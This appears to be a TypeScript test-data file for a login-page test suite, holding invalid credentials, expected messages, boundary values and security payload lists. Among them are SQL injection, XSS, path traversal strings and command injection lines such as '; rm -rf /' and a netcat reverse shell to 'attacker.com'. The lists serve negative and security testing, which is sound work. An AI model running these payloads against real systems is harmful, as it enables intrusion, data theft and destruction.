import { settings } from "../config/settings.js";

// ── Invalid Users ──────────────────────────────────────────────────────────

export const INVALID_USERS = {
  invalid_username: { username: "invaliduser", password: "SuperSecretPassword!" },
  invalid_password: { username: "tomsmith", password: "wrongpassword" },
  empty_username: { username: "", password: "SuperSecretPassword!" },
  empty_password: { username: "tomsmith", password: "" },
  both_empty: { username: "", password: "" },
  nonexistent_user: { username: "nonexistent", password: "NoSuchPass123!" },
} as const;

// ── Expected Messages ─────────────────────────────────────────────────────

export const EXPECTED_MESSAGES = {
  invalid_username: "Your username is invalid!",
  invalid_password: "Your password is invalid!",
  login_success: "You logged into a secure area!",
  logout_success: "You logged out of the secure area!",
  login_page_title: "Login Page",
  secure_area_title: "Secure Area",
  base: "The Internet",
} as const;

// ── Test URLs ─────────────────────────────────────────────────────────────

const BASE = settings.BASE_URL.replace(/\/$/, "");

export const TEST_URLS = {
  base: BASE,
  base_url: BASE,
  login_page: `${BASE}/login`,
  secure_page: `${BASE}/secure`,
  home_page: BASE,
  logout_url: `${BASE}/logout`,
} as const;

// ── Invalid Passwords ─────────────────────────────────────────────────────

export const INVALID_PASSWORDS = {
  empty: "",
  too_short: "Ab1!",
  no_uppercase: "abcdefgh1!",
  no_lowercase: "ABCDEFGH1!",
  no_numbers: "Abcdefgh!@",
  no_special: "Abcdefgh12",
  only_spaces: "        ",
  common_weak: ["password", "123456", "qwerty", "abc123", "letmein", "welcome", "monkey", "master"],
  sequential: "abcdef1234",
  keyboard_pattern: "qwertyuiop",
  repeated_chars: "aaaaaaaaaa",
  too_long: "A".repeat(129),
} as const;

// ── Invalid Usernames ─────────────────────────────────────────────────────

export const INVALID_USERNAMES = {
  empty: "",
  with_spaces: "user name",
  special_chars: "user@#$%",
  with_at: "user@domain",
  with_dots: "user..name",
  starts_with_dot: ".username",
  ends_with_dot: "username.",
  too_long: "a".repeat(250),
  unicode: "\u00FC\u00E9\u00E0\u00F1\u00E7",
  sql_injection: "' OR 1=1 --",
} as const;

// ── Security Payloads ─────────────────────────────────────────────────────

export const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "'; DROP TABLE users; --",
  "' UNION SELECT NULL, NULL --",
  "1' AND '1'='1",
  "admin'--",
  "' OR 1=1#",
] as const;

export const XSS_PAYLOADS = [
  "<script>alert('xss')</script>",
  "<img src=x onerror=alert('xss')>",
  "<svg onload=alert('xss')>",
  "javascript:alert('xss')",
  "<iframe src='javascript:alert(1)'>",
  "'\"><script>alert(document.cookie)</script>",
  "<body onload=alert('xss')>",
  "<input onfocus=alert('xss') autofocus>",
] as const;

export const COMMAND_INJECTION_PAYLOADS = [
  "; ls -la",
  "| cat /etc/passwd",
  "$(whoami)",
  "`id`",
  "&& echo vulnerable",
  "|| echo vulnerable",
  "; rm -rf /",
  "| nc -e /bin/sh attacker.com 4444",
] as const;

export const PATH_TRAVERSAL_PAYLOADS = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "....//....//....//etc/passwd",
  "..%252f..%252f..%252fetc%252fpasswd",
  "/etc/passwd%00.jpg",
] as const;

// ── Invalid Names ─────────────────────────────────────────────────────────

export const INVALID_NAMES = {
  empty: "",
  only_spaces: "   ",
  too_long: "A".repeat(256),
  with_numbers: "John123",
  with_special: "John@Doe",
  with_html: "<b>John</b>",
  with_script: "<script>alert(1)</script>",
  unicode_only: "\u4e2d\u6587\u540d\u5b57",
  single_char: "A",
  with_newline: "John\nDoe",
} as const;

// ── Boundary Values ───────────────────────────────────────────────────────

export const BOUNDARY_VALUES = {
  zero: 0,
  negative_one: -1,
  one: 1,
  max_int: 2147483647,
  min_int: -2147483648,
  max_safe_integer: Number.MAX_SAFE_INTEGER,
  min_safe_integer: Number.MIN_SAFE_INTEGER,
  empty_string: "",
  null_string: "null",
  undefined_string: "undefined",
  very_long_string: "x".repeat(10000),
} as const;

// ── Attack Strings ────────────────────────────────────────────────────────

export const ATTACK_STRINGS: readonly string[] = [
  ...SQL_INJECTION_PAYLOADS,
  ...XSS_PAYLOADS,
  ...COMMAND_INJECTION_PAYLOADS,
  ...PATH_TRAVERSAL_PAYLOADS,
];

// ── Invalid Emails ────────────────────────────────────────────────────────

export const INVALID_EMAILS = {
  no_at: "invalidemail.com",
  no_domain: "user@",
  no_user: "@domain.com",
  double_at: "user@@domain.com",
  spaces: "user name@domain.com",
  special_chars: "user!#$%@domain.com",
  no_tld: "user@domain",
  double_dot: "user@domain..com",
  starts_with_dot: ".user@domain.com",
  ends_with_dot: "user.@domain.com",
  too_long: "a".repeat(245) + "@domain.com",
  unicode: "\u00FC\u00E9\u00E0@domain.com",
} as const;

// ── Helper Functions ──────────────────────────────────────────────────────

function getRandomItem<T>(arr: readonly T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

export function getRandomInvalidEmail(): string {
  const values = Object.values(INVALID_EMAILS);
  return values[Math.floor(Math.random() * values.length)];
}

export function getRandomSqlPayload(): string {
  return getRandomItem(SQL_INJECTION_PAYLOADS);
}

export function getRandomXssPayload(): string {
  return getRandomItem(XSS_PAYLOADS);
}
